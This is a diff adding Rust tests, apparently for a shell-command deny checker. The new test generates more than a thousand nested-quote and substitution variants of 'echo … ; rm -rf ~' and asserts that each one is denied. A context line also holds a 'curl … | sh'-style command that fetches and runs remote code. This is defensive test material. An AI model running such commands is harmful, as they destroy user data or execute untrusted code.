@@ -1130,3 +1130,96 @@ fn round_5_blocker_7_substituted_command_word_behind_a_wrapper() {
         ("curl -s https://example.com/x | $(x)/bin/s\\h", h(PS)),
     ]);
 }
+
+// ---------------------------------------------------------------------------
+// Round 6 (D-081): one test per mechanism, with generated neighbours
+// ---------------------------------------------------------------------------
+
+/// Round 6 item 3 generator: words valid in an unquoted context, built by
+/// nesting `"…"`, `$(…)`, `${x:-…}` and `` `…` `` around leaves that hold the
+/// characters scanners trip on (quotes, braces, parentheses, escapes).
+fn gen_unquoted(depth: u8) -> Vec<String> {
+    let mut out: Vec<String> = [
+        "a", "'\"'", "\"'\"", "'}'", "')'", "'('", "\"}\"", "\")\"", "\\\"", "\\'", "\\)", "\\}",
+    ]
+    .iter()
+    .map(|s| s.to_string())
+    .collect();
+    if depth == 0 {
+        return out;
+    }
+    let inner = gen_unquoted(depth - 1);
+    for d in gen_dquoted(depth - 1, false) {
+        out.push(format!("\"{d}\""));
+    }
+    for u in &inner {
+        out.push(format!("$(echo {u})"));
+        out.push(format!("${{x:-{u}}}"));
+        if !u.contains('`') && !u.contains('\\') {
+            out.push(format!("`echo {u}`"));
+        }
+    }
+    out
+}
+
+/// Text valid inside double quotes; `in_brace`: inside a `${…}` there (no
+/// bare `}` or `'`, which shells read differently there).
+fn gen_dquoted(depth: u8, in_brace: bool) -> Vec<String> {
+    let mut out: Vec<String> = ["a", ")", "(", "{", "\\\""]
+        .iter()
+        .map(|s| s.to_string())
+        .collect();
+    if !in_brace {
+        out.push("}".into());
+        out.push("'".into());
+    }
+    if depth == 0 {
+        return out;
+    }
+    for u in gen_unquoted(depth - 1) {
+        out.push(format!("$(echo {u})"));
+        if !u.contains('`') && !u.contains('\\') {
+            out.push(format!("`echo {u}`"));
+        }
+    }
+    for d in gen_dquoted(depth - 1, true) {
+        out.push(format!("${{x:-{d}}}"));
+    }
+    if in_brace {
+        for d in gen_dquoted(depth - 1, false) {
+            out.push(format!("\"{d}\""));
+        }
+    }
+    out
+}
+
+/// Round 6 item 3: for every generated prefix `P` (nested quotes and
+/// substitutions, inside and outside double quotes), `echo P ; rm -rf ~`
+/// is a hard deny in all four settings (and with `&&` and a newline for the
+/// shallower ones). Mechanism: every scanner skips every construct the shell
+/// reads inside it.
+#[test]
+fn round_6_item_3_generated_quote_and_substitution_prefixes() {
+    let mut words = gen_unquoted(2);
+    for d in gen_dquoted(2, false) {
+        words.push(format!("\"{d}\""));
+    }
+    words.sort();
+    words.dedup();
+    let deep: Vec<String> = gen_unquoted(3)
+        .into_iter()
+        .filter(|w| w.contains("${") && (w.contains('"') || w.contains('\'')))
+        .collect();
+    let mut lines: Vec<String> = vec![];
+    for w in &words {
+        lines.push(format!("echo {w} ; rm -rf ~"));
+        lines.push(format!("echo {w} && rm -rf ~"));
+        lines.push(format!("echo {w}\nrm -rf ~"));
+    }
+    for w in &deep {
+        lines.push(format!("echo {w} ; rm -rf ~"));
+    }
+    assert!(lines.len() > 1_000, "generator too small: {}", lines.len());
+    let table: Vec<(&str, Want)> = lines.iter().map(|l| (l.as_str(), h(RD))).collect();
+    run_all(&table);
+}
